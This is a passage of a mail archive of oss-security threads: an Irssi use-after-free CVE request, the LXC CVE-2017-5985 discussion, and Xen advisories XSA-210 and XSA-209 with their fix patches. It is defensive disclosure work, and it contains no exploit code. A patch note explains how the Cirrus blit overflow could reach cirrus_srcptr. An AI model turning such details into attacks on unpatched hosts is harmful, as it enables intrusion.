##### Ailin Nemui <ailin.nemui@gmail.com>, `1489267555.30133.7.camel@gmail.com`

```
Dear CVE Assignment Team,

please provide CVE for the following issue:

use after free condition during netjoin processing [1]
======================================================
CWE Classification: CWE-416



Description
-----------

Use after free while producing list of netjoins (CWE-416)

This issue was found and reported to us by APic.


Impact
------

This issue usually leads to segmentation faults. Targeted code
execution should be difficult.


Affected versions
-----------------

Irssi up to and including 1.0.1

We believe Irssi 0.8.21 and prior are not affected since a different
code path causes the netjoins to be flushed prior to reaching the use
after free condition.


Fixed in
--------

Irssi 1.0.2


Recommended action
------------------

Upgrade to Irssi 1.0.2. Irssi 1.0.2 is a maintenance release
without any new features.


Patch
-----

https://github.com/irssi/irssi/commit/77b2631c78461965bc9a7414aae206b5c
514e1b3


References
----------

[1] https://irssi.org/security/irssi_sa_2017_03.txt

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489331687.26232_53.Morbo,U=40926:2,T -->

##### Emilio Pozuelo Monfort <pochu27@gmail.com>, `9803a7bd-3938-c25a-f4ef-d6dff8b1fed8@gmail.com`

```
On 11/03/17 22:25, Ailin Nemui wrote:
> Dear CVE Assignment Team,
> 
> please provide CVE for the following issue:

Please report these through http://cveform.mitre.org/ to get CVEs assigned, and
follow up here with the CVE identifiers after that's done.

Thanks,
Emilio

```

</details>

## lxc
<details>
<summary><strong>[oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489088170.6202_41.Morbo,U=40474:2, -->

##### Tyler Hicks <tyhicks@canonical.com>, `8919f274-0c56-2c12-649f-2561d6cd59d8@canonical.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----

iQIcBAEBCgAGBQJYwYjwAAoJENaSAD2qAscKrisP/2FbQwlN9yEscbaUlHJzXBAs
9OzBESZKv+LA4pPwOb8ROGf2cOS0JnKTgKfJZubSTKvSaMLGOy7HRa19gCt81Sm4
iiqqM9vtq+/RtYgPATEjLEj3UpckSEw9qzQNLF4M6oTZRGEoRKXR7Gjo+U/XjVgx
K5l3xoiAO1UqNXfiriWq47c+gFw0eXnVLIAlPBpMPa5m4AG7J/ShEnSfziNGiYnZ
kkGSFrYwyV98ZUGKVwx0/7pLR9zqD1HZFI7zUvGmSr4PTIQ91f4djrzyM7pm2ujA
bKthyn0ZgVTRsctfI7dHu5gKOd72om2er9kSmo6m3S/6b6I6z7lUrgePACKuf5bx
807I5+vzU2hJy0tkdk0V+1jVe6p9wYHfOZHxSZe5fUgx8DDsvnrAG1xLia7v8mi0
y0Fq2PHmqe9hTgxE7oesSHQvt2AqnvYWanJ26knRuoaPqKEMtVL46ofPcm+JCBV3
bce4lTvlYlLv7jolYUgbU4aWi3OJnluK5WDYYWO9edT61iT0Xvqk3wPnUFOHPrOP
4W3i2oZj/96Y5b2SJgJ5F4MixgnxY+YcwpH7KSLgqNtB8961awu5lFI3fwS9Xenh
WEgjc5XU9X7V4CLEuZrJwd4eaV+pGO4skwRg8ePXPYdVfAumFGno7HkTQtcye4zc
e0a7pAzaOVPgs/LYH9Fp
=0pAh
-----END PGP SIGNATURE-----


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489180562.16902_33.Morbo,U=40783:2, -->

##### Stiepan <stie@itk.swiss>, `Ya92X4yQVrEDADDRD-xy-FeIBfDkxTwkyuxI1ATPJl5YbwqpJDwGpa-5HQzKiS09u8o1yNNyHK9G-fzxNDU5NqURXqe49zTp4--EQYjHh8g=@itk.swiss`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
I don't know whether that is the same bug, or a related one, but on Debian8 using LXC from jessie-backports, setting the default route in a container affects the host - namely, from an unpriv. container, setting the route sets the host's route as well.
lxc-info --version outputs 2.0.6 and no update is currently available (on Debian).

Stiepan



-------- Original Message --------
Subject: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
Local Time: 9 March 2017 5:54 PM
UTC Time: 9 March 2017 16:55
From: tyhicks@canonical.com
To: oss-security@lists.openwall.com
Stéphane Graber <stgraber@ubuntu.com>

Jann Horn discovered that the lxc-user-nic program could be tricked into
operating on a network namespace over which the caller did not hold
privilege.

The behavior didn't follow what was documented in the lxc-user-nic(1)
man page:

It ensures that the calling user is privileged over the network
namespace to which the interface will be attached.

This issue is CVE-2017-5985.

https://lists.linuxcontainers.org/pipermail/lxc-users/2017-March/012925.html
https://launchpad.net/bugs/1654676
https://github.com/lxc/lxc/commit/16af238036a5464ae8f2420ed3af214f0de875f9

Tyler
```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489453735.21869_1.Morbo,U=41645:2, -->

##### Tyler Hicks <tyhicks@canonical.com>, `831d5907-bf61-70c2-9501-f57923e5ae07@canonical.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----

iQIcBAEBCgAGBQJYx0JCAAoJENaSAD2qAscK2p4QAIsfTKp/k6Mb1OjGopG6HyWS
GCgl0MURCih3E0w56DeYG3hFjOeDqCXKqVnl2EMC1hBVlSL6xdNWT4MwVnlF+N1G
kHlmjIXn+aSMdHFh4rdYLrj+y32T3TU8vb1sAjvXAxE1CiQu2VjWgZM0RYesxxh9
r7bCS3J6CJhkIQQUuYGbMLAbhs7SBjcXjXDQmJM+KbDbCVcLs035bJ6iRI/bCJoY
0fBw618uzfqfl6AM+DzsYwXf2Rrf5avY0aAH3nwumV8CUphxP1rBXTuEwO2uMoai
rf+/IhcOirl18TrLyz+csDxOAqJjrJRHMn9LA7uxDh0Oijr6/U/TU7bBz8i2zGt+
DM7ncNZLHb7JF0WrFRPqizdOSVDh7wkDCXH4Q502nQF6vUykvS+PYrgakVUjLqmO
zqNv7x4/pm1eWLfVl9e7vfTK2QB+8/vYqOCSVUKzjR6aAqkvWP0rV0rfENCGkci2
HRj9K9/rwGVuKkb44m4S55RkmteLp5AvLOztRuEnuIOLRm+qcTvjTDlBuym4t0AA
RbybXRPvh2Y1mR9DKmJxNJkkyCcbWIXYylH2asDrsh6IfsyrkkJez67bX4DPLaHq
LT8cLeQ0xcWGtAXsqapWaKFlBO6b1HKHe51FcUbvwVsQsrXvusDE2RcRtJFY9tBn
RWLXaCMWoI2/6fybnceO
=O4ab
-----END PGP SIGNATURE-----


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489508397.2864_1.Morbo,U=9196:2,T -->

##### Stiepan <stie@itk.swiss>, `9C8Q126sS901vkG8mMxgQPigkx5gBFpDrXBZJqzB9mfVVKvASCmxDOcSAiq9IjkGPjKbAm7r44vrPcqypgDoadrQ2Wuo4wYXFHdQ8amAvwk=@itk.swiss`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
You are welcome. As stated in my reply to Serge H. Hallyn's off-list message, in the meantime I have installed version 2.0.7 from jessie-backports and am unable to reproduce the issue, as I cannot start unprivileged containers anymore (due to a network error). According to Debian's tracker page for lxc, the version that I have installed from backports is 2.0.7-1, which does not include latest upstream fixes. I guess that I have to wait for the 2.0.7-2 package - which includes latest upstream fixes - to land in jessie-backports for these issues (both security and functional) to be fixed.

CC-ing the Debian address for this bug, as they explicitly asked to do this in case there is a need to reopen the Debian bug, which seems to be the case here (at least, for Jessie, since the intermediary 2.0.7-1 .deb apparently breaks unprivileged networking, besides not fixing the security issue).
To the Debian team in charge of this bug:
As unprivileged mode is not activated by default on Debian, I understand that this is not a priority, but it would still be nice to have this fixed quickly.
By the way, not directly related to this specific bug, but I hope that snapd + LXD somehow finds its way into jessie-backports: that would be great!

Stiepan


-------- Original Message --------
Subject: Re: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
Local Time: 14 March 2017 2:06 AM
UTC Time: 14 March 2017 01:07
From: tyhicks@canonical.com
To: oss-security@lists.openwall.com
Stéphane Graber <stgraber@ubuntu.com>, serge.hallyn@ubuntu.com

On 03/10/2017 06:03 AM, Stiepan wrote:
> I don't know whether that is the same bug, or a related one, but on Debian8 using LXC from jessie-backports, setting the default route in a container affects the host - namely, from an unpriv. container, setting the route sets the host's route as well.
> lxc-info --version outputs 2.0.6 and no update is currently available (on Debian).

Thanks for the report. I just tried to reproduce the issue on Ubuntu
16.04 with 2.0.7-0ubuntu1~16.04.2, which is the package patched for the
issue that I announced in this thread. I couldn't reproduce it.

I then installed an old 2.0.6 based deb (2.0.6-0ubuntu1~ubuntu16.04.1)
and still couldn't reproduce it.

I'd suggest opening an upstream bug here:

https://github.com/lxc/lxc/issues/new

(Normally, they prefer private security bugs on Launchpad but your
report to this list is already public so I don't see a need.)

Tyler

> Stiepan
>
>
>
> -------- Original Message --------
> Subject: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
> Local Time: 9 March 2017 5:54 PM
> UTC Time: 9 March 2017 16:55
> From: tyhicks@canonical.com
> To: oss-security@lists.openwall.com
> Stéphane Graber <stgraber@ubuntu.com>
>
> Jann Horn discovered that the lxc-user-nic program could be tricked into
> operating on a network namespace over which the caller did not hold
> privilege.
>
> The behavior didn't follow what was documented in the lxc-user-nic(1)
> man page:
>
> It ensures that the calling user is privileged over the network
> namespace to which the interface will be attached.
>
> This issue is CVE-2017-5985.
>
> https://lists.linuxcontainers.org/pipermail/lxc-users/2017-March/012925.html
> https://launchpad.net/bugs/1654676
> https://github.com/lxc/lxc/commit/16af238036a5464ae8f2420ed3af214f0de875f9
>
> Tyler
>
```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489578970.8027_1.Morbo,U=41794:2, -->

##### Stiepan <stie@itk.swiss>, `yEw48KeZXecR-EKWWbAiNN-28xRPMYmv5qRYVlLwbDs4oH3fwjTstCNrpqptLwzG1mqIHxjMk-hiWRreJGC1WJmbY-daelcKJWMJdrb77z0=@itk.swiss`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
I have found a workaround to start the container in user mode again on Debian 8:
use a "true" br0 bridge instead of lxc-br0 and disable, or stop the lxc-net service.

Under these conditions, using lxc 2.0.7(-1) from jessie-backports, I am not able to reproduce the routing issue I saw running lxc 2.0.6 in user mode using lxc-net. So a safe fallback (for Debian 8), for the time being, seems to be to avoid using user mode lxc networking and use a plain old br0 instead. This should work on all CPU architectures (even on powerpc, known to be recalcitrant to lxc on Debian 8).

Stiepan

-------- Original Message --------
Subject: Re: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
Local Time: 14 March 2017 5:17 PM
UTC Time: 14 March 2017 16:17
From: stie@itk.swiss
To: oss-security@lists.openwall.com <oss-security@lists.openwall.com>, 857295@bugs.debian.org <857295@bugs.debian.org>
Stéphane Graber <stgraber@ubuntu.com>, serge.hallyn@ubuntu.com

You are welcome. As stated in my reply to Serge H. Hallyn's off-list message, in the meantime I have installed version 2.0.7 from jessie-backports and am unable to reproduce the issue, as I cannot start unprivileged containers anymore (due to a network error). According to Debian's tracker page for lxc, the version that I have installed from backports is 2.0.7-1, which does not include latest upstream fixes. I guess that I have to wait for the 2.0.7-2 package - which includes latest upstream fixes - to land in jessie-backports for these issues (both security and functional) to be fixed.

CC-ing the Debian address for this bug, as they explicitly asked to do this in case there is a need to reopen the Debian bug, which seems to be the case here (at least, for Jessie, since the intermediary 2.0.7-1 .deb apparently breaks unprivileged networking, besides not fixing the security issue).
To the Debian team in charge of this bug:
As unprivileged mode is not activated by default on Debian, I understand that this is not a priority, but it would still be nice to have this fixed quickly.
By the way, not directly related to this specific bug, but I hope that snapd + LXD somehow finds its way into jessie-backports: that would be great!

Stiepan

-------- Original Message --------
Subject: Re: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
Local Time: 14 March 2017 2:06 AM
UTC Time: 14 March 2017 01:07
From: tyhicks@canonical.com
To: oss-security@lists.openwall.com
Stéphane Graber <stgraber@ubuntu.com>, serge.hallyn@ubuntu.com

On 03/10/2017 06:03 AM, Stiepan wrote:
> I don't know whether that is the same bug, or a related one, but on Debian8 using LXC from jessie-backports, setting the default route in a container affects the host - namely, from an unpriv. container, setting the route sets the host's route as well.
> lxc-info --version outputs 2.0.6 and no update is currently available (on Debian).

Thanks for the report. I just tried to reproduce the issue on Ubuntu
16.04 with 2.0.7-0ubuntu1~16.04.2, which is the package patched for the
issue that I announced in this thread. I couldn't reproduce it.

I then installed an old 2.0.6 based deb (2.0.6-0ubuntu1~ubuntu16.04.1)
and still couldn't reproduce it.

I'd suggest opening an upstream bug here:

https://github.com/lxc/lxc/issues/new

(Normally, they prefer private security bugs on Launchpad but your
report to this list is already public so I don't see a need.)

Tyler

> Stiepan
>
>
>
> -------- Original Message --------
> Subject: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
> Local Time: 9 March 2017 5:54 PM
> UTC Time: 9 March 2017 16:55
> From: tyhicks@canonical.com
> To: oss-security@lists.openwall.com
> Stéphane Graber <stgraber@ubuntu.com>
>
> Jann Horn discovered that the lxc-user-nic program could be tricked into
> operating on a network namespace over which the caller did not hold
> privilege.
>
> The behavior didn't follow what was documented in the lxc-user-nic(1)
> man page:
>
> It ensures that the calling user is privileged over the network
> namespace to which the interface will be attached.
>
> This issue is CVE-2017-5985.
>
> https://lists.linuxcontainers.org/pipermail/lxc-users/2017-March/012925.html
> https://launchpad.net/bugs/1654676
> https://github.com/lxc/lxc/commit/16af238036a5464ae8f2420ed3af214f0de875f9
>
> Tyler
>
```

</details>

---

</details>

## xen
<details>
<summary><strong>[oss-security] Xen Security Advisory 210 - arm: memory corruption when freeing p2m pages</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_18.NdNdNx,U=7701:2,T -->

##### Xen.org security team <security@xen.org>, `E1cgwFe-0005Mf-Pk@xenbits.xenproject.org`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

                    Xen Security Advisory XSA-210

             arm: memory corruption when freeing p2m pages

ISSUE DESCRIPTION
=================

When freeing pages used for stage-2 page tables, the freeing routine
failed to remove these pages from an internally managed list they were
put on during allocation.  The same list node elements are also
used by the hypervisor's page allocator.  Subsequent manipulation of
ARM's private P2M list could therefore corrupt the lists maintained by
the page allocator.  The buggy code is exposed to guests via the
XENMEM_decrease_reservation hypercall.

IMPACT
======

A malicious or buggy guest may corrupt hypervisor state, commonly
leading to a host crash (Denial of Service).  Privilege escalation or
information leaks cannot be excluded.

VULNERABLE SYSTEMS
==================

Only Xen version 4.8 is affected.  Xen versions 4.7 and earlier are not
vulnerable.

Only ARM systems are vulnerable.  X86 based systems are not vulnerable.

MITIGATION
==========

There is no known mitigation.

NOTE REGARDING LACK OF EMBARGO
==============================

The issue was discussed publicly before being recognized as a security
issue.

RESOLUTION
==========

Applying the attached patch resolves this issue.

xsa210.patch           xen-unstable, Xen 4.8.x

$ sha256sum xsa210*
10e26c017c916dcac261c6a3c92656831f0ad037f792940e6faf6905c6e23861  xsa210.patch
$

CREDITS
=======

The initial bug was discovered by Vijay Kilari of Cavium and the
security aspect was diagnosed by Julien Grall of ARM.

DEPLOYMENT DURING EMBARGO
=========================

Deployment of the patches and/or mitigations described above (or
others which are substantially similar) is permitted during the
embargo, even on public-facing systems with untrusted guest users and
administrators.

But: Distribution of updated software is prohibited (except to other
members of the predisclosure list).

Predisclosure list members who wish to deploy significantly different
patches and/or mitigations, please contact the Xen Project Security
Team.

(Note: this during-embargo deployment notice is retained in
post-embargo publicly released Xen Project advisories, even though it
is then no longer applicable.  This is to enable the community to have
oversight of the Xen Project Security Team's decisionmaking.)

For more information about permissible uses of embargoed information,
consult the Xen Project community's agreed Security Policy:
  http://www.xenproject.org/security-policy.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQEcBAEBAgAGBQJYrw2aAAoJEIP+FMlX6CvZuw4H/34z2io/65h2RLDL3bx4w//A
nWNcrceKrxyvtZmTss56RHrUeiOOKOeuCXWMx5CSihBcSRXqyZa79IDul9t1b7fB
m6NUPerILGueF3uOYTRUvvSiWKWRzVPOCgqSxlCmd7YTrkjHZkq/x2Gb9Acj3hrl
yE0fFdD/hTIN9wZtHWY+gTIXMIGHBJ4/xieZeYZvylbnmu9nDC0WIupTExonWqie
sG0DICl+eKJMt3ioSzaGd9117Xk1P7JWvcr7MJQvzn/2VDTG2TjC4kZE1iDHHVPz
+txQh2G2Luf+jX5VQSqWnlv7I9zuGlqYEpAMQacjrLzGejuqPSC2kbzliOEoCaE=
=1k3w
-----END PGP SIGNATURE-----


```

</details>
<details><summary>Additional Parts</summary>

```
From: Julien Grall <julien.grall@arm.com>
Subject: arm/p2m: remove the page from p2m->pages list before freeing it

The p2m code is using the page list field to link all the pages used
for the stage-2 page tables. The page is added into the p2m->pages
list just after the allocation but never removed from the list.

The page list field is also used by the allocator, not removing may
result a later Xen crash due to inconsistency (see [1]).

This bug was introduced by the reworking of p2m code in commit 2ef3e36ec7
"xen/arm: p2m: Introduce p2m_set_entry and __p2m_set_entry".

[1] https://lists.xenproject.org/archives/html/xen-devel/2017-02/msg00524.html

Reported-by: Vijaya Kumar K <Vijaya.Kumar@cavium.com>
Signed-off-by: Julien Grall <julien.grall@arm.com>
Reviewed-by: Stefano Stabellini <sstabellini@kernel.org>

--- a/xen/arch/arm/p2m.c
+++ b/xen/arch/arm/p2m.c
@@ -660,6 +660,7 @@ static void p2m_free_entry(struct p2m_domain *p2m,
     unsigned int i;
     lpae_t *table;
     mfn_t mfn;
+    struct page_info *pg;
 
     /* Nothing to do if the entry is invalid. */
     if ( !p2m_valid(entry) )
@@ -697,7 +698,10 @@ static void p2m_free_entry(struct p2m_domain *p2m,
     mfn = _mfn(entry.p2m.base);
     ASSERT(mfn_valid(mfn_x(mfn)));
 
-    free_domheap_page(mfn_to_page(mfn_x(mfn)));
+    pg = mfn_to_page(mfn_x(mfn));
+
+    page_list_del(pg, &p2m->pages);
+    free_domheap_page(pg);
 }
 
 static bool p2m_split_superpage(struct p2m_domain *p2m, lpae_t *entry,

```

</details>

---

</details>
<details>
<summary><strong>[oss-security] Xen Security Advisory 209 (CVE-2017-2620) - cirrus_bitblt_cputovideo does not check if memory region is safe</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_15.NdNdNx,U=7698:2,T -->

##### Xen.org security team <security@xen.org>, `E1cgvh1-00026E-Rs@xenbits.xenproject.org`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

            Xen Security Advisory CVE-2017-2620 / XSA-209
                              version 4

   cirrus_bitblt_cputovideo does not check if memory region is safe

UPDATES IN VERSION 4
====================

Include a prerequisite patch for qemu-upstream, correct statement
regarding the availability of a qemu-traditional patch.

ISSUE DESCRIPTION
=================

In CIRRUS_BLTMODE_MEMSYSSRC mode the bitblit copy routine
cirrus_bitblt_cputovideo fails to check wethehr the specified memory
region is safe.

IMPACT
======

A malicious guest administrator can cause an out of bounds memory
write, very likely exploitable as a privilege escalation.

VULNERABLE SYSTEMS
==================

Versions of qemu shipped with all Xen versions are vulnerable.

Xen systems running on x86 with HVM guests, with the qemu process
running in dom0 are vulnerable.

Only guests provided with the "cirrus" emulated video card can exploit
the vulnerability.  The non-default "stdvga" emulated video card is
not vulnerable.  (With xl the emulated video card is controlled by the
"stdvga=" and "vga=" domain configuration options.)

ARM systems are not vulnerable.  Systems using only PV guests are not
vulnerable.

For VMs whose qemu process is running in a stub domain, a successful
attacker will only gain the privileges of that stubdom, which should
be only over the guest itself.

Both upstream-based versions of qemu (device_model_version="qemu-xen")
and `traditional' qemu (device_model_version="qemu-xen-traditional")
are vulnerable.

MITIGATION
==========

Running only PV guests will avoid the issue.

Running HVM guests with the device model in a stubdomain will mitigate
the issue.

Changing the video card emulation to stdvga (stdvga=1, vga="stdvga",
in the xl domain configuration) will avoid the vulnerability.

CREDITS
=======

This issue was discovered by Gerd Hoffmann of Red Hat.

RESOLUTION
==========

Applying the appropriate attached patch resolves this issue.

xsa209-qemuu/*.patch     qemu-xen, qemu upstream
xsa209-qemut.patch       qemu-xen-traditional

$ sha256sum xsa209* xsa209*/*
167af9ed7163fa7cf4abb52f865290ced3163c7684151bdc1324eb5e534faf13  xsa209-qemut.patch
e698b73d8de24af0fe33968a43561e5e1d094f4caf2443caa447b552677d2683  xsa209-qemuu/0001-display-cirrus-ignore-source-pitch-value-as-needed-i.patch
50c60e45151ef2265cce4f92b204e9fd75f8bc8952f097e77ab4fe1c1446bc98  xsa209-qemuu/0002-cirrus-add-blit_is_unsafe-call-to-cirrus_bitblt_cput.patch

DEPLOYMENT DURING EMBARGO
=========================

Deployment of the patches described above (or others which are
substantially similar) is permitted during the embargo, even on
public-facing systems with untrusted guest users and administrators.

However, deployment of the "stdvga" mitigation (changing the video
card emulation to stdvga) is NOT permitted (except where all the
affected systems and VMs are administered and used only by
organisations which are members of the Xen Project Security Issues
Predisclosure List).  Specifically, deployment on public cloud systems
is NOT permitted.  This is because this produces a guest-visible
change which will indicate which component contains the vulnerability.

Additionally, distribution of updated software is prohibited (except
to other members of the predisclosure list).

Predisclosure list members who wish to deploy significantly different
patches and/or mitigations, please contact the Xen Project Security
Team.


(Note: this during-embargo deployment notice is retained in
post-embargo publicly released Xen Project advisories, even though it
is then no longer applicable.  This is to enable the community to have
oversight of the Xen Project Security Team's decisionmaking.)

For more information about permissible uses of embargoed information,
consult the Xen Project community's agreed Security Policy:
  http://www.xenproject.org/security-policy.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQEcBAEBAgAGBQJYrwN/AAoJEIP+FMlX6CvZQoQIAK9UiN9VwXv1I0E7X1TL2TjE
P9SNXkI5wKiwCq22pbz9pjBO//ia3M5UoxpDMwaMAQzn9bEThHnki8x2njRxIEF7
frxm6B8DpHLCoRHiqgwi018JHLLcSbr+KQrZqBns1j5BfOF0in89A8cgBmQrziyX
bj9853Q8dHSUNW1vi8vZkMacIwxMCg4sBLjSRUoqiWmoyfU6XodRwZ3LoglsofTj
/jk/G5OiitqXDBPzvclPRddQ53xiN9eN3fV8IdG6QpX6F+C2qQVDyS8kAqqFmmm6
Vn6yl9UxrmP0OmvQ5CgUw8GWQoY3OqObjiPgfNUdbN+CLjdhdGfF3kGuYIniqd4=
=I92f
-----END PGP SIGNATURE-----


```

</details>
<details><summary>Additional Parts</summary>

```
From: Gerd Hoffmann <kraxel@redhat.com>
Subject: [PATCH 3/3] cirrus: add blit_is_unsafe call to cirrus_bitblt_cputovideo

CIRRUS_BLTMODE_MEMSYSSRC blits do NOT check blit destination
and blit width, at all.  Oops.  Fix it.

Security impact: high.

The missing blit destination check allows to write to host memory.
Basically same as CVE-2014-8106 for the other blit variants.

The missing blit width check allows to overflow cirrus_bltbuf,
with the attractive target cirrus_srcptr (current cirrus_bltbuf write
position) being located right after cirrus_bltbuf in CirrusVGAState.

Due to cirrus emulation writing cirrus_bltbuf bytewise the attacker
hasn't full control over cirrus_srcptr though, only one byte can be
changed.  Once the first byte has been modified further writes land
elsewhere.

[ This is CVE-2017-2620 / XSA-209  - Ian Jackson ]

Fixed compilation by removing extra parameter to blit_is_unsafe. -iwj

Reported-by: Gerd Hoffmann <ghoffman@redhat.com>
Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
Signed-off-by: Ian Jackson <ian.jackson@eu.citrix.com>
---
diff --git a/hw/cirrus_vga.c b/hw/cirrus_vga.c
index e6c3893..45facb6 100644
--- a/hw/cirrus_vga.c
+++ b/hw/cirrus_vga.c
@@ -900,6 +900,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 {
     int w;
 
+    if (blit_is_unsafe(s)) {
+        return 0;
+    }
+
     s->cirrus_blt_mode &= ~CIRRUS_BLTMODE_MEMSYSSRC;
     s->cirrus_srcptr = &s->cirrus_bltbuf[0];
     s->cirrus_srcptr_end = &s->cirrus_bltbuf[0];
@@ -925,6 +929,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 	}
         s->cirrus_srccounter = s->cirrus_blt_srcpitch * s->cirrus_blt_height;
     }
+
+    /* the blit_is_unsafe call above should catch this */
+    assert(s->cirrus_blt_srcpitch <= CIRRUS_BLTBUFSIZE);
+
     s->cirrus_srcptr = s->cirrus_bltbuf;
     s->cirrus_srcptr_end = s->cirrus_bltbuf + s->cirrus_blt_srcpitch;
     cirrus_update_memory_access(s);

```

</details>
<details><summary>Additional Parts</summary>

```
From 52b7f43c8fa185ab856bcaacda7abc9a6fc07f84 Mon Sep 17 00:00:00 2001
From: Bruce Rogers <brogers@suse.com>
Date: Tue, 21 Feb 2017 10:54:38 -0800
Subject: [PATCH 1/2] display: cirrus: ignore source pitch value as needed in
 blit_is_unsafe

Commit 4299b90 added a check which is too broad, given that the source
pitch value is not required to be initialized for solid fill operations.
This patch refines the blit_is_unsafe() check to ignore source pitch in
that case. After applying the above commit as a security patch, we
noticed the SLES 11 SP4 guest gui failed to initialize properly.

Signed-off-by: Bruce Rogers <brogers@suse.com>
Message-id: 20170109203520.5619-1-brogers@suse.com
Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c | 11 +++++++----
 1 file changed, 7 insertions(+), 4 deletions(-)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index 7bf3707..34a6900 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -288,7 +288,7 @@ static bool blit_region_is_unsafe(struct CirrusVGAState *s,
     return false;
 }
 
-static bool blit_is_unsafe(struct CirrusVGAState *s)
+static bool blit_is_unsafe(struct CirrusVGAState *s, bool dst_only)
 {
     /* should be the case, see cirrus_bitblt_start */
     assert(s->cirrus_blt_width > 0);
@@ -302,6 +302,9 @@ static bool blit_is_unsafe(struct CirrusVGAState *s)
                               s->cirrus_blt_dstaddr & s->cirrus_addr_mask)) {
         return true;
     }
+    if (dst_only) {
+        return false;
+    }
     if (blit_region_is_unsafe(s, s->cirrus_blt_srcpitch,
                               s->cirrus_blt_srcaddr & s->cirrus_addr_mask)) {
         return true;
@@ -667,7 +670,7 @@ static int cirrus_bitblt_common_patterncopy(CirrusVGAState * s,
 
     dst = s->vga.vram_ptr + (s->cirrus_blt_dstaddr & s->cirrus_addr_mask);
 
-    if (blit_is_unsafe(s))
+    if (blit_is_unsafe(s, false))
         return 0;
 
     (*s->cirrus_rop) (s, dst, src,
@@ -685,7 +688,7 @@ static int cirrus_bitblt_solidfill(CirrusVGAState *s, int blt_rop)
 {
     cirrus_fill_t rop_func;
 
-    if (blit_is_unsafe(s)) {
+    if (blit_is_unsafe(s, true)) {
         return 0;
     }
     rop_func = cirrus_fill[rop_to_index[blt_rop]][s->cirrus_blt_pixelwidth - 1];
@@ -784,7 +787,7 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 
 static int cirrus_bitblt_videotovideo_copy(CirrusVGAState * s)
 {
-    if (blit_is_unsafe(s))
+    if (blit_is_unsafe(s, false))
         return 0;
 
     cirrus_do_copy(s, s->cirrus_blt_dstaddr - s->vga.start_addr,
-- 
2.1.4


```

</details>
<details><summary>Additional Parts</summary>

```
From 15268f91fbe75b38a851c458aef74e693d646ea5 Mon Sep 17 00:00:00 2001
From: Gerd Hoffmann <kraxel@redhat.com>
Date: Tue, 21 Feb 2017 10:54:59 -0800
Subject: [PATCH 2/2] cirrus: add blit_is_unsafe call to
 cirrus_bitblt_cputovideo

CIRRUS_BLTMODE_MEMSYSSRC blits do NOT check blit destination
and blit width, at all.  Oops.  Fix it.

Security impact: high.

The missing blit destination check allows to write to host memory.
Basically same as CVE-2014-8106 for the other blit variants.

The missing blit width check allows to overflow cirrus_bltbuf,
with the attractive target cirrus_srcptr (current cirrus_bltbuf write
position) being located right after cirrus_bltbuf in CirrusVGAState.

Due to cirrus emulation writing cirrus_bltbuf bytewise the attacker
hasn't full control over cirrus_srcptr though, only one byte can be
changed.  Once the first byte has been modified further writes land
elsewhere.

[ This is CVE-2017-2620 / XSA-209  - Ian Jackson ]

Reported-by: Gerd Hoffmann <ghoffman@redhat.com>
Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c | 8 ++++++++
 1 file changed, 8 insertions(+)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index 34a6900..5901250 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -865,6 +865,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 {
     int w;
 
+    if (blit_is_unsafe(s, true)) {
+        return 0;
+    }
+
     s->cirrus_blt_mode &= ~CIRRUS_BLTMODE_MEMSYSSRC;
     s->cirrus_srcptr = &s->cirrus_bltbuf[0];
     s->cirrus_srcptr_end = &s->cirrus_bltbuf[0];
@@ -890,6 +894,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 	}
         s->cirrus_srccounter = s->cirrus_blt_srcpitch * s->cirrus_blt_height;
     }
+
+    /* the blit_is_unsafe call above should catch this */
+    assert(s->cirrus_blt_srcpitch <= CIRRUS_BLTBUFSIZE);
+
     s->cirrus_srcptr = s->cirrus_bltbuf;
     s->cirrus_srcptr_end = s->cirrus_bltbuf + s->cirrus_blt_srcpitch;
     cirrus_update_memory_access(s);
-- 
